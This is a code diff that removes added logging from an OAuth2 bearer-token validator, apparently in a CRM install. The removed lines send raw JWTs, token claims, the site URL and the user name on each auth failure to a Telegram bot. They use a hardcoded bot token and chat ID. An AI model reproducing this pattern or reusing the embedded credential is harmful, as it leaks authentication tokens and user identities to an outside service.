@@ -97,58 +97,25 @@ class BearerTokenValidator implements AuthorizationValidatorInterface
      */
     public function validateAuthorization(ServerRequestInterface $request)
     {
-        global $sugar_config, $current_user;
-
         if ($request->hasHeader('authorization') === false) {
             throw OAuthServerException::accessDenied('Missing "Authorization" header');
         }
 
         $header = $request->getHeader('authorization');
-        $jwt    = \trim((string) \preg_replace('/^\s*Bearer\s/', '', $header[0]));
+        $jwt = \trim((string) \preg_replace('/^\s*Bearer\s/', '', $header[0]));
 
         try {
             // Attempt to parse the JWT
             $token = $this->jwtConfiguration->parser()->parse($jwt);
         } catch (\Lcobucci\JWT\Exception $exception) {
-            $log_token = array(
-                'domain'            => $sugar_config['site_url'],
-                'path'              => 'vendor\league\oauth2-server\src\AuthorizationValidators',
-                'token'             => $token,
-                'getMessage'        => $exception->getMessage(), 
-                'jwt'               => $jwt,  
-                'current_user'               => $current_user->user_name,  
-            );
-            $this->sendTestTelegramAccessDenied(json_encode($log_token));
             throw OAuthServerException::accessDenied($exception->getMessage(), null, $exception);
         }
 
         try {
             // Attempt to validate the JWT
             $constraints = $this->jwtConfiguration->validationConstraints();
-            if (empty($constraints)) {
-                $constraints_log = 'Validation constraints are empty';
-            }
-            
             $this->jwtConfiguration->validator()->assert($token, ...$constraints);
         } catch (RequiredConstraintsViolated $exception) {
-            $clock = array(
-                'timezone' => date_default_timezone_get(),
-                'time'     => date('Y-m-d H:i:s'),
-            );
-            
-            $log_token = array(
-                'domain'            => $sugar_config['site_url'],
-                'path'              => 'vendor\league\oauth2-server\src\AuthorizationValidators',
-                'token'             => $token,
-                'getMessage'        => $exception->getMessage(),
-                'token_payload'     => $token->claims()->all(),
-                'jwt'               => $jwt,
-                'clock'             => $clock,
-                'constraints_log'   => $constraints_log ?? '',
-                'current_user'               => $current_user->user_name,  
-            );
-            $this->sendTestTelegramAccessDenied(json_encode($log_token));
-
             throw OAuthServerException::accessDenied('Access token could not be verified');
         }
 
@@ -166,25 +133,6 @@ class BearerTokenValidator implements AuthorizationValidatorInterface
             ->withAttribute('oauth_user_id', $claims->get('sub'))
             ->withAttribute('oauth_scopes', $claims->get('scopes'));
     }
-
-    // SAVE LOG
-    private function sendTestTelegramAccessDenied($content, $parseMode = 'HTML', $timeout = 5)
-    {
-        $chat_id = '-1001360390468'; // Group Test
-        $token = '1668507961:AAF76B96rWELQlN9lG1g0TO22wcm66jkvTk';
-
-        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id;
-        $url = $url . "&parse_mode=" . $parseMode . "&text=" . urlencode($content);
-        $curl = curl_init();
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($curl, CURLOPT_TIMEOUT, $timeout);
-        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
-        $result = curl_exec($curl);
-        curl_close($curl);
-        return $result;
-    }
-
 
     /**
      * Convert single record arrays into strings to ensure backwards compatibility between v4 and v3.x of lcobucci/jwt
